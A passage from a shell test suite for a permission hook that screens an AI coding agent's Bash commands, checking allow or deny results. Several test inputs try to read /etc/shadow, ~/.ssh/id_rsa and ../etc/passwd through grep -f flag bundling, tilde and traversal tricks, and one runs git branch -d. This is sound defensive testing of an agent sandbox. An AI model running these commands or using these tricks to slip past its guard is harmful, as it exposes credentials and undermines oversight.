  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f=/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep -f/etc/shadow x → deny (bundled short flag, abs path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep -f~/.ssh/id_rsa x → deny (bundled short flag, tilde)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f~/.ssh/id_rsa x"}}' \
  "tilde path"

run_case "cx: grep -f../etc/passwd x → deny (bundled short flag, traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f../etc/passwd x"}}' \
  "path traversal"

run_case "cx: grep -f/tmp/foo x → allow (bundled short flag, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f/tmp/foo x"}}'

run_case "cx: grep -i pattern → allow (bare short flag, no value)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -i pattern file"}}'

run_case "cx: grep -iE pattern → allow (combined short flags, not path)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -iE pattern file"}}'

# --- v5: --flag VALUE space form (positional validation on next iter) ---
run_case "cx: grep --file /etc/shadow x → deny (space form; value as positional)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file /etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep --file /tmp/foo x → allow (space form; value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file /tmp/foo x"}}'

# Mutation-sensitive: distinguishes branch flag-gate (not the array entry).
run_case "cx: git branch -d foo → deny (gate enforces destructive flag)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -d foo"}}' \
  "destructive/mutating flag"

# --- v4: dead-code regression (stash/branch removed from array) ---
# These would silently pass if the per-subcmd gates were also removed;
# combined with the explicit deny tests above, mutation testing is now strict.
run_case "cx: git status (still allowed via array)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status --short"}}'

run_case "cx: git branch -a (only branch gate sets allowed=1 now)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -a"}}'

run_case "cx: git stash list (only stash gate sets allowed=1 now)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash list"}}'

# =============================================================================
# summary
# =============================================================================

echo
echo "----"
echo "$PASS passed, $FAIL failed"
if [[ $FAIL -gt 0 ]]; then
  echo "failed cases:"
  for c in "${FAILED_CASES[@]}"; do
    echo "  - $c"
  done
  exit 1
fi
exit 0
